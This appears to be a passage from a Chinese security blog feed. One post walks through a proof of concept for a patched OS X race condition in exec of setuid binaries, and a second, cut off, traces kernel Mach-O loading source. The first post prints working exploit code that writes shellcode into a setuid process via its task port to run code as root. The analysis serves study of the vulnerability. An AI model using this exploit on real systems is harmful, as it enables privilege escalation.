class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// register a name with launchd</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> bootstrap_port;</span><br><span class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't get bootstrap port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建一个具有接受消息权限的port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> service_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(),</span><br><span class="line">                           MACH_PORT_RIGHT_RECEIVE,</span><br><span class="line">                           &amp;service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't allocate service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//为port添加SEND权限</span></span><br><span class="line">  err = mach_port_insert_right(mach_task_self(),</span><br><span class="line">                               service_port,</span><br><span class="line">                               service_port,</span><br><span class="line">                               MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't insert make send right"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// 注册一个全局的Port</span></span><br><span class="line">  <span class="comment">// 之后的子进程会继承这个port</span></span><br><span class="line">  err = bootstrap_register(bootstrap_port, service_name, service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't register service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[+] registered service \"%s\" with launchd to receive child thread port\n"</span>, service_name);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fork a child</span></span><br><span class="line">  <span class="keyword">pid_t</span> child_pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (child_pid == <span class="number">0</span>) &#123;</span><br><span class="line">    do_child();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    do_parent(service_port);</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数在建立了port之后之后fork出子程序，开始做各自做的事情。</p>
<h2 id="3-2_do_child">3.2 do_child</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_child</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//查找全局的port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> bootstrap_port;</span><br><span class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child can't get bootstrap port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> service_port;</span><br><span class="line">  err = bootstrap_look_up(bootstrap_port, service_name, &amp;service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child can't get service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// create a reply port:</span></span><br><span class="line">  <span class="comment">// 创建一个具有接受消息权限的port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> reply_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;reply_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to allocate reply port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send it our task port</span></span><br><span class="line">  <span class="comment">// 将子进程的port发送给父进程</span></span><br><span class="line">  <span class="keyword">task_msg_send_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  msg.header.msgh_size = <span class="keyword">sizeof</span>(msg);</span><br><span class="line">  msg.header.msgh_local_port = reply_port;</span><br><span class="line">  msg.header.msgh_remote_port = service_port;</span><br><span class="line">  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;</span><br><span class="line"></span><br><span class="line">  msg.body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  msg.port.name = mach_task_self();</span><br><span class="line">  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;msg.header);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to send thread port message"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a reply to ack that the other end got our thread port</span></span><br><span class="line">  <span class="comment">// 等待父进程回复</span></span><br><span class="line">  <span class="keyword">ack_msg_recv_t</span> reply = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;reply.header, MACH_RCV_MSG, <span class="number">0</span>, <span class="keyword">sizeof</span>(reply), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to receive ack"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// exec the suid-root binary</span></span><br><span class="line">  <span class="comment">// 执行setuid的程序traceroute6</span></span><br><span class="line">  <span class="keyword">char</span>* argv[] = &#123;suid_binary_path, <span class="string">"-w"</span>, <span class="string">"rofl"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span>* envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">  execve(suid_binary_path, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>子进程做的事情也非常的简单，将自己的port发送给父进程，确保父进程已经获取到port之后，执行setuid的程序，poc中使用的是traceroute6。</p>
<h2 id="3-3_do_parent">3.3  do_parent</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_parent</span><span class="params">(mach_port_t service_port)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// generate the page we want to write into the child:</span></span><br><span class="line">  <span class="comment">// 申请一页内存，并且会将这一页内存写入子进程</span></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> addr = <span class="number">0</span>;</span><br><span class="line">  err = mach_vm_allocate(mach_task_self(),</span><br><span class="line">                         &amp;addr,</span><br><span class="line">                         <span class="number">4096</span>,</span><br><span class="line">                         VM_FLAGS_ANYWHERE);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"failed to mach_vm_allocate memory"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//将0x153c处的写入shellcode</span></span><br><span class="line">  FILE* f = fopen(suid_binary_path, <span class="string">"r"</span>);</span><br><span class="line">  fseek(f, <span class="number">0x1000</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">  fread((<span class="keyword">char</span>*)addr, <span class="number">0x1000</span>, <span class="number">1</span>, f);</span><br><span class="line">  fclose(f);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(((<span class="keyword">char</span>*)addr)+<span class="number">0x53c</span>, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait to get the child's task port on the service port:</span></span><br><span class="line">  <span class="comment">// 等待子进程发送过来的port</span></span><br><span class="line">  <span class="keyword">task_msg_recv_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;msg.header,</span><br><span class="line">                 MACH_RCV_MSG,</span><br><span class="line">                 <span class="number">0</span>,</span><br><span class="line">                 <span class="keyword">sizeof</span>(msg),</span><br><span class="line">                 service_port,</span><br><span class="line">                 MACH_MSG_TIMEOUT_NONE,</span><br><span class="line">                 MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"error receiving service message"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> target_task_port = msg.port.name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// before we ack the task port message to signal that the other process should execve the suid</span></span><br><span class="line">  <span class="comment">// binary get the lowest mapped address:</span></span><br><span class="line">  <span class="comment">// 立刻获取内存的信息</span></span><br><span class="line">  <span class="keyword">struct</span> vm_region_basic_info_64 region;</span><br><span class="line">  <span class="keyword">mach_msg_type_number_t</span> region_count = VM_REGION_BASIC_INFO_COUNT_64;</span><br><span class="line">  <span class="keyword">memory_object_name_t</span> object_name = MACH_PORT_NULL; <span class="comment">/* unused */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_vm_size_t</span> target_first_size = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> original_first_addr = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">  err = mach_vm_region(target_task_port,</span><br><span class="line">                       &amp;original_first_addr,</span><br><span class="line">                       &amp;target_first_size,</span><br><span class="line">                       VM_REGION_BASIC_INFO_64,</span><br><span class="line">                       (<span class="keyword">vm_region_info_t</span>)&amp;region,</span><br><span class="line">                       &amp;region_count,</span><br><span class="line">                       &amp;object_name);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"unable to get first mach_vm_region for target process\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[+] looks like the target processes lowest mapping is at %zx prior to execve\n"</span>, original_first_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send an ack message to the reply port indicating that we have the thread port</span></span><br><span class="line">  <span class="keyword">ack_msg_send_t</span> ack = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_msg_type_name_t</span> reply_port_rights = MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits);</span><br><span class="line"></span><br><span class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, <span class="number">0</span>);</span><br><span class="line">  ack.header.msgh_size = <span class="keyword">sizeof</span>(ack);</span><br><span class="line">  ack.header.msgh_local_port = MACH_PORT_NULL;</span><br><span class="line">  ack.header.msgh_remote_port = msg.header.msgh_remote_port;</span><br><span class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, <span class="number">0</span>); <span class="comment">// use the same rights we got</span></span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;ack.header);</span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"parent failed sending ack"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> target_first_addr = <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// wait until we see that the map has been swapped and the binary is loaded into it:</span></span><br><span class="line">    <span class="comment">// 不断的循环去获取内存的信息</span></span><br><span class="line">    region_count = VM_REGION_BASIC_INFO_COUNT_64;</span><br><span class="line">    object_name = MACH_PORT_NULL; <span class="comment">/* unused */</span></span><br><span class="line">    target_first_size = <span class="number">0x1000</span>;</span><br><span class="line">    target_first_addr = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    err = mach_vm_region(target_task_port,</span><br><span class="line">                         &amp;target_first_addr,</span><br><span class="line">                         &amp;target_first_size,</span><br><span class="line">                         VM_REGION_BASIC_INFO_64,</span><br><span class="line">                         (<span class="keyword">vm_region_info_t</span>)&amp;region,</span><br><span class="line">                         &amp;region_count,</span><br><span class="line">                         &amp;object_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_first_addr != original_first_addr &amp;&amp; target_first_addr &lt; <span class="number">0x200000000</span>) &#123;</span><br><span class="line">      <span class="comment">// the first address has changed implying that the map was swapped</span></span><br><span class="line">      <span class="comment">// let's try to win the race</span></span><br><span class="line">      <span class="comment">// 当发现获取到的内存信息与之前的不同</span></span><br><span class="line">      <span class="comment">// 说明竞争的窗口打开了</span></span><br><span class="line">      <span class="comment">// 可以尝试去写入shellcode了</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//写入shellcode</span></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> target_addr = target_first_addr + <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">mach_msg_type_number_t</span> target_size = <span class="number">0x1000</span>;</span><br><span class="line">  mach_vm_protect(target_task_port, target_addr, target_size, <span class="number">0</span>, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);</span><br><span class="line">  mach_vm_write(target_task_port, target_addr, addr, target_size);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hopefully overwrote some code in the target...\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"the target first addr changed to %zx\n"</span>, target_first_addr);</span><br><span class="line">  <span class="comment">//子进程窗口关闭后内存已经被改写，正常执行到entry时，将执行shellcode。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>父进程的行为比较复杂：</p>
<ul>
<li>构建shellcode</li>
<li>获取子进程port</li>
<li>根据子进程的内存信息得到竞争的窗口打开的时机</li>
<li>写入shellcode，等待shellcode执行。</li>
</ul>
<h1 id="0x04_小结">0x04 小结</h1><p>​    通过梳理poc与内核源码后，在了解了<code>execv</code>函数一系列的执行流程，已经内核的一系列内存操作的工具函数之后，这个漏洞其实就是一个简单的逻辑漏洞，通过一个旧的port可以在port被关闭前，任意改写进程的内存地址，当目标进程碰巧是setuid的进程时，就具有了root权限执行任意代码的能力。</p>
<p>​    通过poc的分析，应该学习巩固的知识如下：</p>
<ul>
<li>execv的执行流程</li>
<li>port的使用</li>
<li>mach_vm_* API</li>
</ul>
<p>​    充分理解poc的原理后，可以进一步对这个漏洞的Exploit to get kernel code execution做出更详细的分析，从而反思与总结，如何在开发中预防这种漏洞的产生以及如何通过测试或者代码审计的手段发现类似的漏洞。</p>
<h1 id="参考">参考</h1><ol>
<li>[<a href="https://www.freebsd.org/cgi/man.cgi?query=vnode" target="_blank" rel="external">https://www.freebsd.org/cgi/man.cgi?query=vnode</a></li>
<li><a href="https://www.freebsd.org/cgi/man.cgi?query=namei&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html" target="_blank" rel="external">https://www.freebsd.org/cgi/man.cgi?query=namei&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html</a></li>
<li><a href="http://www.manualpages.de/OpenBSD/OpenBSD-5.0/man9/pmap_create.9.html" target="_blank" rel="external">http://www.manualpages.de/OpenBSD/OpenBSD-5.0/man9/pmap_create.9.html</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;redir=1" target="_blank" rel="external">Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS</a></li>
<li><a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html" target="_blank" rel="external">Race you to the kernel!</a></li>
</ol>
<h1 id="ps">ps</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/" target="_blank" rel="external">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
<p>灵犀一指可攻可守，进攻时也是一指，是天下第一指法，与移花接玉这个天下第一掌法同样都是非兵刃的第一绝技</p>
<p>—陆小凤传奇</p>
</blockquote>
<p>最近的10.11.4补丁修复了一个利用条件竞争获得代码执行权限的漏洞，经过对内核源码以及poc的理解之后，先对问题作出一个简单的分析。</p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
      <category term="execv" scheme="http://yoursite.com/tags/execv/"/>
    
      <category term="ports" scheme="http://yoursite.com/tags/ports/"/>
    
      <category term="race" scheme="http://yoursite.com/tags/race/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://yoursite.com/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[OSX内核加载mach-o流程分析]]></title>
    <link href="http://yoursite.com/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2016/03/30/OSX内核加载mach-o流程分析/</id>
    <published>2016-03-30T23:58:05.000Z</published>
    <updated>2016-03-31T15:39:14.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    研究<code>OS X</code>安全方面的知识需要对<code>mach-o</code>加载的流程需要有一个比较完整的理解，断断续续一个月的时间里面，通过对源码的阅读对<code>mach-o</code>的加载有一个比较基本的认识，在遇到各个具体的问题是才能更好的理解和操作。</p>
<p>​    其他相关文章可以看这里，基本涵盖了从内核态到应用层的相关源码的简单分析。还有不足之处在遇到相关的问题时也会加到这一系列文章中。</p>
<p>​    1.<a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">mach-o加载流程学习-dyld对主image的处理流程</a></p>
<p>​    2.<a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/" target="_blank" rel="external">mach-o加载流程学习-dyld对依赖库的加载流程</a></p>
<p>​    3.mach-o加载流程学习-内核对mach-o文件的加载流程(本文)</p>
<p>​    </p>
<p>​    通过一张图片，可以比较清楚的理解整个流程。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="整体流程"></p>
<a id="more"></a>
<h1 id="0x01_源码分析">0x01 源码分析</h1><h2 id="1-1___mac_execve">1.1 __mac_execve</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__mac_execve(<span class="keyword">proc_t</span> p, <span class="keyword">struct</span> __mac_execve_args *uap, <span class="keyword">int32_t</span> *retval)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *bufp = <span class="literal">NULL</span>; </span><br><span class="line">	<span class="keyword">struct</span> image_params *imgp;</span><br><span class="line">	<span class="keyword">struct</span> vnode_attr *vap;</span><br><span class="line">	<span class="keyword">struct</span> vnode_attr *origvap;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> is_64 = IS_64BIT_PROCESS(p);</span><br><span class="line">	<span class="keyword">struct</span> vfs_context context;</span><br><span class="line">	<span class="keyword">struct</span> uthread	*uthread;</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">//初始化context</span></span><br><span class="line">	context.vc_thread = current_thread();</span><br><span class="line">	context.vc_ucred = kauth_cred_proc_ref(p);	<span class="comment">/* <span class="label">XXX must NOT be kauth_cred_get() */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocate a big chunk for locals instead of using stack since these  </span><br><span class="line">	 * structures a pretty big.</span><br><span class="line">	 */</span></span><br><span class="line">  	//申请一块连续的大内存，用来存放imgp，vap，origvap的数据结构</span><br><span class="line">	MALLOC(bufp, char *, (sizeof(*imgp) + sizeof(*vap) + sizeof(*origvap)), M_TEMP, M_WAITOK | M_ZERO);</span><br><span class="line">	imgp = (struct image_params *) bufp;</span><br><span class="line">	if (bufp == NULL) &#123;</span><br><span class="line">		error = ENOMEM</span><br><span class="line">		goto exit_with_error;</span><br><span class="line">	&#125;</span><br><span class="line">  	//通过数据结构size的偏移，指向对应的内存空间</span><br><span class="line">  	//imgp,vap,origvap实际是连续的一块内存</span><br><span class="line">	vap = (struct vnode_attr *) (bufp + sizeof(*imgp));</span><br><span class="line">	origvap = (struct vnode_attr *) (bufp + sizeof(*imgp) + sizeof(*vap));</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Initialize the common data in the image_params structure */</span></span><br><span class="line">	//初始化数据</span><br><span class="line">  	imgp-&gt;ip_user_fname = uap-&gt;fname;</span><br><span class="line">	imgp-&gt;ip_user_argv = uap-&gt;argp;</span><br><span class="line">	imgp-&gt;ip_user_envv = uap-&gt;envp;</span><br><span class="line">	imgp-&gt;ip_vattr = vap;</span><br><span class="line">	imgp-&gt;ip_origvattr = origvap;</span><br><span class="line">	imgp-&gt;ip_vfs_context = &amp;context;</span><br><span class="line">	imgp-&gt;ip_flags = (is_64 ? IMGPF_WAS_64BIT : IMGPF_NONE) | ((p-&gt;p_flag &amp; P_DISABLE_ASLR) ? IMGPF_DISABLE_ASLR : IMGPF_NONE);</span><br><span class="line">	imgp-&gt;ip_seg = (is_64 ? UIO_USERSPACE64 : UIO_USERSPACE32);</span><br><span class="line">	imgp-&gt;ip_mac_return = 0;</span><br><span class="line"></span><br><span class="line">  	//设置线程信息</span><br><span class="line">	uthread = 